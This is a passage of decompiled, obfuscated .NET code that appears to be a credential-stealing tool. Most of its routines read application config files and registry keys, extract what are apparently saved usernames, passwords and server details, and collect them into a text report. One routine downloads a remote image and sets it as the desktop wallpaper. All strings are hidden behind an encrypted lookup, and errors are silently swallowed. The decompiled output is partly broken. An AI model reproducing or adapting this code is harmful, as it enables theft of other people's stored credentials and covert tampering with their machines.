        {
          try
          {
            this.\u0002(this.\u0001[32]);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
      if (Conversions.ToBoolean(this.\u0001[37]))
        \u0005.\u0001.\u0087();
      if (Conversions.ToBoolean(this.\u0001[28]))
      {
        try
        {
          if (!System.IO.File.Exists(this.\u0001 + \u0003.\u0003.\u0001(1819)))
          {
            FileStream fileStream = new FileStream(this.\u0001 + \u0003.\u0003.\u0001(1819), FileMode.Create, FileAccess.Write);
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      ProjectData.EndApp();
    }

    [DllImport("user32", EntryPoint = "SystemParametersInfoA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int \u0002(int uAction, int uParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpvParam, int fuWinIni);

    private object \u0002([In] string obj0)
    {
      WebClient webClient = new WebClient();
      string str = obj0.Substring(checked (obj0.Length - 4));
      if (!System.IO.File.Exists(Path.GetTempPath() + \u0003.\u0003.\u0001(2258) + str))
      {
        webClient.DownloadFile(obj0, Path.GetTempPath() + \u0003.\u0003.\u0001(2258) + str);
      }
      else
      {
        System.IO.File.Delete(Path.GetTempPath() + \u0003.\u0003.\u0001(2258) + str);
        webClient.DownloadFile(obj0, Path.GetTempPath() + \u0003.\u0003.\u0001(2258) + str);
      }
      Image.FromFile(Path.GetTempPath() + \u0003.\u0003.\u0001(2258) + str).Save(Path.GetTempPath() + \u0003.\u0003.\u0001(2271), ImageFormat.Bmp);
      string lpvParam = Path.GetTempPath() + \u0003.\u0003.\u0001(2271);
      \u0003.\u0003.\u0002(20, 0, ref lpvParam, 1);
      return (object) null;
    }

    private void \u0003([In] object obj0, [In] EventArgs obj1)
    {
      try
      {
        \u0005.\u0001.\u0004();
        \u0005.\u0001.\u0005();
        \u0005.\u0001.\u0006();
        \u0005.\u0001.\u0007();
        \u0005.\u0001.\u0008();
        \u0005.\u0001.\u000E();
        \u0005.\u0001.\u000F();
        \u0005.\u0001.\u0010();
        \u0005.\u0001.\u0011();
        \u0005.\u0001.\u0012();
        \u0005.\u0001.\u0013();
        \u0005.\u0001.\u0002();
        \u0005.\u0001.\u0014();
        \u0005.\u0001.\u0015();
        \u0005.\u0001.\u0016();
        \u0005.\u0001.\u0017();
        \u0005.\u0001.\u0018();
        \u0005.\u0001.\u0019();
        \u0005.\u0001.\u001A();
        \u0005.\u0001.\u001B();
        \u0005.\u0001.\u001C();
        \u0005.\u0001.\u001D();
        \u0005.\u0001.\u001E();
        \u0005.\u0001.\u001F();
        \u0005.\u0001.\u007F();
        \u0005.\u0001.\u0080();
        \u0005.\u0001.\u0081();
        \u0005.\u0001.\u0082();
        \u0005.\u0001.\u0002();
        \u0005.\u0001.\u0003();
        \u0005.\u0001.\u0083();
        \u0005.\u0001.\u0084();
        \u0005.\u0001.\u0086();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public string \u0002()
    {
      string str1 = this.\u0002(Interaction.Environ(\u0003.\u0003.\u0001(742)) + \u0003.\u0003.\u0001(2292) + FileSystem.Dir(Interaction.Environ(\u0003.\u0003.\u0001(742)) + \u0003.\u0003.\u0001(2353)));
      string str2 = this.\u0002(str1, \u0003.\u0003.\u0001(2422), \u0003.\u0003.\u0001(2431));
      string str3 = this.\u0002(str1, \u0003.\u0003.\u0001(2444), \u0003.\u0003.\u0001(2453));
      string Left = this.\u0002(str1, \u0003.\u0003.\u0001(2466), \u0003.\u0003.\u0001(2475));
      string str4 = this.\u0002(str1, \u0003.\u0003.\u0001(2488), \u0003.\u0003.\u0001(2505));
      string str5 = this.\u0002(str1, \u0003.\u0003.\u0001(2522), \u0003.\u0003.\u0001(2531));
      if (Operators.CompareString(Left, \u0003.\u0003.\u0001(276), false) != 0)
      {
        try
        {
          TextBox textBox = this.\u0002();
          textBox.Text = textBox.Text + \u0003.\u0003.\u0001(2544) + str5 + \u0003.\u0003.\u0001(2609) + str2 + \u0003.\u0003.\u0001(2626) + str3 + \u0003.\u0003.\u0001(2631) + Left + \u0003.\u0003.\u0001(2648) + str4 + \u0003.\u0003.\u0001(2661);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      string str6;
      return str6;
    }

    public object \u0002()
    {
      try
      {
        string str1 = this.\u0002(Interaction.Environ(\u0003.\u0003.\u0001(742)) + \u0003.\u0003.\u0001(2726));
        string str2 = this.\u0002(str1, \u0003.\u0003.\u0001(2422), \u0003.\u0003.\u0001(2431));
        string str3 = this.\u0002(str1, \u0003.\u0003.\u0001(2444), \u0003.\u0003.\u0001(2453));
        this.\u0002(str1, \u0003.\u0003.\u0001(2767), \u0003.\u0003.\u0001(2784));
        string Left = this.\u0002(str1, \u0003.\u0003.\u0001(2466), \u0003.\u0003.\u0001(2475));
        string str4 = this.\u0002(str1, \u0003.\u0003.\u0001(2801), \u0003.\u0003.\u0001(2810));
        if (Operators.CompareString(Left, \u0003.\u0003.\u0001(276), false) != 0)
        {
          try
          {
            TextBox textBox = this.\u0002();
            textBox.Text = textBox.Text + \u0003.\u0003.\u0001(2823) + str2 + \u0003.\u0003.\u0001(2626) + str3 + \u0003.\u0003.\u0001(2631) + Left + \u0003.\u0003.\u0001(2648) + str4 + \u0003.\u0003.\u0001(2888);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      object obj;
      return obj;
    }

    public string \u0003()
    {
      string str1 = this.\u0002(Interaction.Environ(\u0003.\u0003.\u0001(742)) + \u0003.\u0003.\u0001(2901)).Substring(0, 1);
      string str2 = this.RegRead(\u0003.\u0003.\u0001(2926) + str1 + \u0003.\u0003.\u0001(2995));
      string str3 = this.RegRead(\u0003.\u0003.\u0001(2926) + str1 + \u0003.\u0003.\u0001(3004));
      string Left = this.RegRead(\u0003.\u0003.\u0001(2926) + str1 + \u0003.\u0003.\u0001(3013));
      string str4 = this.RegRead(\u0003.\u0003.\u0001(2926) + str1 + \u0003.\u0003.\u0001(3022));
      this.RegRead(\u0003.\u0003.\u0001(2926) + str1 + \u0003.\u0003.\u0001(3027));
      if (Operators.CompareString(Left, \u0003.\u0003.\u0001(276), false) != 0)
      {
        TextBox textBox = this.\u0002();
        textBox.Text = textBox.Text + \u0003.\u0003.\u0001(3036) + str2 + \u0003.\u0003.\u0001(3097) + str3 + \u0003.\u0003.\u0001(2631) + Left + \u0003.\u0003.\u0001(2648) + str4 + \u0003.\u0003.\u0001(3102);
      }
      string str5;
      return str5;
    }

    public string \u0004()
    {
      string str1 = this.\u0002(Strings.Replace(Interaction.Environ(\u0003.\u0003.\u0001(742)), Interaction.Environ(\u0003.\u0003.\u0001(3167)), \u0003.\u0003.\u0001(3180)) + \u0003.\u0003.\u0001(3193));
      string str2 = this.\u0002(str1, \u0003.\u0003.\u0001(3222), \u0003.\u0003.\u0001(975));
      string str3 = this.\u0002(str1, \u0003.\u0003.\u0001(3227), \u0003.\u0003.\u0001(975));
      string Left = this.\u0002(str1, \u0003.\u0003.\u0001(3236), \u0003.\u0003.\u0001(975));
      string str4 = this.\u0002(str1, \u0003.\u0003.\u0001(3245), \u0003.\u0003.\u0001(975));
      if (Operators.CompareString(Left, \u0003.\u0003.\u0001(276), false) != 0)
      {
        try
        {
          TextBox textBox = this.\u0002();
          textBox.Text = textBox.Text + \u0003.\u0003.\u0001(3254) + str2 + \u0003.\u0003.\u0001(2626) + str3 + \u0003.\u0003.\u0001(2631) + Left + \u0003.\u0003.\u0001(2648) + str4 + \u0003.\u0003.\u0001(2888);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      string str5;
      return str5;
    }

    public string \u0005()
    {
      try
      {
        string str1 = this.\u0002(Strings.Replace(this.RegRead(\u0003.\u0003.\u0001(3319)), \u0003.\u0003.\u0001(3457), (string) null) + \u0003.\u0003.\u0001(3478), -1);
        string str2 = this.\u0002(str1, \u0003.\u0003.\u0001(3495), \u0003.\u0003.\u0001(3508));
        string str3 = this.\u0002(str1, \u0003.\u0003.\u0001(3508), \u0003.\u0003.\u0001(3517));
        string Left = this.\u0002(str1, \u0003.\u0003.\u0001(3534), \u0003.\u0003.\u0001(3543));
        string str4 = this.\u0002(str1, \u0003.\u0003.\u0001(3517), \u0003.\u0003.\u0001(3534));
        this.\u0002(str1, \u0003.\u0003.\u0001(3560), \u0003.\u0003.\u0001(3495));
        if (Operators.CompareString(Left, \u0003.\u0003.\u0001(276), false) != 0)
        {
          try
          {
            TextBox textBox = this.\u0002();
            textBox.Text = textBox.Text + \u0003.\u0003.\u0001(3569) + str2 + \u0003.\u0003.\u0001(2626) + str3 + \u0003.\u0003.\u0001(2631) + Left + \u0003.\u0003.\u0001(2648) + str4 + \u0003.\u0003.\u0001(3638);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      string str;
      return str;
    }

    public string \u0002([In] string obj0, [In] int obj1)
    {
      string str;
      try
      {
        string[] strArray = \u0002.\u0002.\u0002().FileSystem.ReadAllText(obj0, Encoding.Default).Split('\r');
        str = obj1 <= 0 ? (obj1 >= 0 ? \u0003.\u0003.\u0001(276) : strArray[checked (strArray.Length + obj1 - 1)]) : strArray[checked (obj1 - 1)];
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = \u0003.\u0003.\u0001(276);
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public string \u0002([In] string obj0)
    {
      string str;
      try
      {
        str = new StreamReader(obj0).ReadToEnd().ToString();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public string \u0002([In] string obj0, [In] string obj1, [In] string obj2)
    {
      string str;
      try
      {
        str = Strings.Split(Strings.Split(obj0, obj1)[1], obj2)[0];
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public string RegRead([In] string obj0)
    {
      string str;
      try
      {
        object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(\u0003.\u0003.\u0001(3703), \u0003.\u0003.\u0001(276)));
        string MemberName = \u0003.\u0003.\u0001(3724);
        object[] objArray = new object[1]{ (object) obj0 };
        object[] Arguments = objArray;
        bool[] flagArray = new bool[1]{ true };
        bool[] CopyBack = flagArray;
        object obj = NewLateBinding.LateGet(objectValue, (System.Type) null, MemberName, Arguments, (string[]) null, (System.Type[]) null, CopyBack);
        if (flagArray[0])
          obj0 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (string));
        str = Conversions.ToString(obj);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public void \u0003()
    {
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num2 = 2;
        string str1 = Conversions.ToString(\u0002.\u0002.\u0002().Registry.GetValue(\u0003.\u0003.\u0001(3737), \u0003.\u0003.\u0001(3167), (object) null));
        string str2 = Conversions.ToString(\u0002.\u0002.\u0002().Registry.GetValue(\u0003.\u0003.\u0001(3737), \u0003.\u0003.\u0001(3794), (object) null));
        string str3 = Conversions.ToString(\u0002.\u0002.\u0002().Registry.GetValue(\u0003.\u0003.\u0001(3737), \u0003.\u0003.\u0001(3807), (object) null));
        string str4 = Conversions.ToString(\u0002.\u0002.\u0002().Registry.GetValue(\u0003.\u0003.\u0001(3737), \u0003.\u0003.\u0001(3828), (object) null));
        string str5 = Conversions.ToString(\u0002.\u0002.\u0002().Registry.GetValue(\u0003.\u0003.\u0001(3737), \u0003.\u0003.\u0001(3849), (object) null));
        string str6 = \u0003.\u0003.\u0001(975);
        TextBox textBox = this.\u0002();
        textBox.Text = textBox.Text + \u0003.\u0003.\u0001(3862) + str6 + \u0003.\u0003.\u0001(3915) + str1 + str6 + \u0003.\u0003.\u0001(3932) + \u0002.\u0003.\u0002(str2) + str6 + \u0003.\u0003.\u0001(3949) + str3 + str6 + \u0003.\u0003.\u0001(3970) + \u0002.\u0003.\u0002(str4) + str6 + \u0003.\u0003.\u0001(3995) + str5 + str6 + str6;
        goto label_6;
label_1:
        num1 = -1;
        switch (num2)
        {
          case 2:
            goto label_6;
        }
      }
      catch (Exception ex) when (
      {
        // ISSUE: unable to correctly present filter
        int num3;
        if (ex is Exception & num2 != 0 & num3 == 0)
        {
          SuccessfulFiltering;
        }
        else
          throw;
      }
      )
      {
        ProjectData.SetProjectError(ex);
        goto label_1;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_6:
      if (num1 == 0)
        return;
      ProjectData.ClearProjectError();
    }
  }
}
